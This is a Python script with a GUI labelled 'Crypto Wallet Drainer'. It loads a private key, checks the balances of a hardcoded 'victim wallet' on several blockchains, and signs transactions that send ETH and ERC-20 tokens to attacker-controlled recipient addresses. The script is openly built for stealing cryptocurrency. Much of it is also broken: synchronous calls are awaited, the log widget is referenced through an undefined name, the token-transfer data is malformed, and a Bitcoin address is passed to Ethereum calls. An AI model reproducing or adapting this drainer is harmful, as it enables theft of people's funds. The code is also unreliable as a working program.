import asyncio
import aiohttp
import json
import requests
from web3 import Web3, HTTPProvider
#from web3 import Web3, AsyncHTTPProvider
from eth_account import Account
from eth_account.signers.local import LocalAccount
from datetime import datetime
import time
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext
import socket
import http.server
import socketserver

# Load configuration
with open("config.json") as f:
    config = json.load(f)

private_key = config["private_key"]
recipient_addresses = config["recipient_addresses"]
blockchain_providers = config["blockchain_providers"]

# Initialize web3 for Ethereum
#from web3 import Web3, HTTPProvider
#w3 = Web3(AsyncHTTPProvider(blockchain_providers["ETH"]))
w3 = Web3(HTTPProvider(blockchain_providers["ETH"]))
w3.eth.default_account = Account.from_key(private_key).address

# Function to get balance of a token on a chain
def get_token_balance(chain, address, token_address):
    if chain == "BTC":
        url = f"https://blockchair.com/bitcoin/api/address/{address}"
        response = requests.get(url).json()
        return int(response["data"]["balance"])
    elif chain == "ETH":
        balance = w3.eth.get_balance(address)
        return w3.from_wei(balance, "ether")
    elif chain == "SOL":
        url = f"https://api.solscan.io/api/v1/address/{address}"
        response = requests.get(url).json()
        return int(response["data"]["balance"])
    elif chain == "BNB":
        url = f"https://bsc-mainnet.chainbase.com/api/v3/address/{address}/balance"
        response = requests.get(url).json()
        return int(response["data"]["balance"])
    elif chain == "TRX":
        url = f"https://api.trongrid.io/wallets/address/{address}"
        response = requests.get(url).json()
        return int(response["data"]["balance"])
    else:
        return 0

# Function to get ERC-20 tokens
def get_erc20_tokens():
    url = "https://api.etherscan.io/api?module=stats&action=tokensupply"
    response = requests.get(url).json()
    return response["result"]

# Function to drain a wallet
async def drain_wallet(wallet_address):
    print(f"Draining wallet: {wallet_address}")
    print(f"Time: {datetime.now()}")
    log_text.insert(tk.END, f"Draining wallet: {wallet_address}\n")
    log_text.insert(tk.END, f"Time: {datetime.now()}\n")

    # Drain Ethereum
    eth_balance = get_token_balance("ETH", wallet_address, "")
    if eth_balance > 0:
        print(f"ETH Balance: {eth_balance} ETH")
        log_text.insert(tk.END, f"ETH Balance: {eth_balance} ETH\n")
        tx = {
            "to": recipient_addresses["ETH"],
            "value": eth_balance,
            "gas": 21000,
            "gasPrice": await w3.eth.generate_gas_price(),
            "chainId": 1,
            "from": wallet_address
        }
        signed_tx = await w3.eth.account.sign_transaction(tx, private_key=private_key)
        tx_hash = await w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"ETH Transaction sent: {tx_hash.hex()}")
        log_text.insert(tk.END, f"ETH Transaction sent: {tx_hash.hex()}\n")
        receipt = await w3.eth.wait_for_transaction_receipt(tx_hash)
        if receipt.status == 1:
            log_text.insert(tk.END, "ETH Transaction confirmed: Success\n")
            messagebox.showinfo("Success", "ETH Transaction Success!")
        else:
            log_text.insert(tk.END, f"ETH Transaction failed: {receipt.status}\n")
            messagebox.showerror("Error", "ETH Transaction Failed!")

    # Drain ERC-20 tokens
    erc20_tokens = get_erc20_tokens()
    for token in erc20_tokens:
        token_address = token["contractAddress"]
        url = f"https://api.etherscan.io/api?module=account&action=tokenbalance&address={wallet_address}&contractaddress={token_address}&tag=latest"
        response = requests.get(url).json()
        token_balance = int(response["result"]) / 10**18
        if token_balance > 0:
            print(f"ERC-20 Token {token_address} Balance: {token_balance} tokens")
            log_text.insert(tk.END, f"ERC-20 Token {token_address} Balance: {token_balance} tokens\n")
            tx = {
                "to": recipient_addresses["ETH"],
                "value": 0,
                "data": f"0x{token_address.lower()}{token_balance.to_bytes(32, 'big').hex()}",
                "gas": 21000,
                "gasPrice": await w3.eth.generate_gas_price(),
                "chainId": 1,
                "from": wallet_address
            }
            signed_tx = await w3.eth.account.sign_transaction(tx, private_key=private_key)
            tx_hash = await w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            print(f"ERC-20 Transaction sent: {tx_hash.hex()}")
            log_text.insert(tk.END, f"ERC-20 Transaction sent: {tx_hash.hex()}\n")
            receipt = await w3.eth.wait_for_transaction_receipt(tx_hash)
            if receipt.status == 1:
                log_text.insert(tk.END, "ERC-20 Transaction confirmed: Success\n")
                messagebox.showinfo("Success", "ERC-20 Transaction Success!")
            else:
                log_text.insert(tk.END, f"ERC-20 Transaction failed: {receipt.status}\n")
                messagebox.showerror("Error", "ERC-20 Transaction Failed!")

    # Drain Bitcoin
    btc_balance = get_token_balance("BTC", wallet_address, "")
    if btc_balance > 0:
        print(f"BTC Balance: {btc_balance} BTC")
        log_text.insert(tk.END, f"BTC Balance: {btc_balance} BTC\n")
        print(f"BTC will be drained to: {recipient_addresses['BTC']}")
        log_text.insert(tk.END, f"BTC will be drained to: {recipient_addresses['BTC']}\n")

    # Drain Solana
    sol_balance = get_token_balance("SOL", wallet_address, "")
    if sol_balance > 0:
        print(f"SOL Balance: {sol_balance} SOL")
        log_text.insert(tk.END, f"SOL Balance: {sol_balance} SOL\n")
        print(f"SOL will be drained to: {recipient_addresses['SOL']}")
        log_text.insert(tk.END, f"SOL will be drained to: {recipient_addresses['SOL']}\n")

    # Drain BNB
    bnb_balance = get_token_balance("BNB", wallet_address, "")
    if bnb_balance > 0:
        print(f"BNB Balance: {bnb_balance} BNB")
        log_text.insert(tk.END, f"BNB Balance: {bnb_balance} BNB\n")
        print(f"BNB will be drained to: {recipient_addresses['BNB']}")
        log_text.insert(tk.END, f"BNB will be drained to: {recipient_addresses['BNB']}\n")

    # Drain TRX
    trx_balance = get_token_balance("TRX", wallet_address, "")
    if trx_balance > 0:
        print(f"TRX Balance: {trx_balance} TRX")
        log_text.insert(tk.END, f"TRX Balance: {trx_balance} TRX\n")
        print(f"TRX will be drained to: {recipient_addresses['TRX']}")
        log_text.insert(tk.END, f"TRX will be drained to: {recipient_addresses['TRX']}\n")

    print(f"Wallet drained: {wallet_address}")
    print(f"Time: {datetime.now()}\n")
    log_text.insert(tk.END, f"Wallet drained: {wallet_address}\n")
    log_text.insert(tk.END, f"Time: {datetime.now()}\n")

# Main function
async def main():
    # Example victim wallet address
    victim_wallet = "bc1q2jzu4pgx3tlapyzncfvgfpxudcn0e2kc6vhqs7"
    await drain_wallet(victim_wallet)

# GUI Setup
class DrainerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Crypto Wallet Drainer")
        self.root.geometry("800x600")

        # Label
        self.label = tk.Label(root, text="Crypto Wallet Drainer", font=("Arial", 16))
        self.label.pack(pady=10)

        # Start Button
        self.start_button = tk.Button(root, text="Start Draining", command=self.start_draining, font=("Arial", 12))
        self.start_button.pack(pady=10)

        # Log Area
        self.log_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=100, height=20, font=("Arial", 10))
        self.log_text.pack(padx=10, pady=10)

    def start_draining(self):
        self.start_button.config(state=tk.DISABLED)
        asyncio.run(main())
        self.start_button.config(state=tk.NORMAL)

# Run GUI
if __name__ == "__main__":
    root = tk.Tk()
    app = DrainerApp(root)
    root.mainloop()
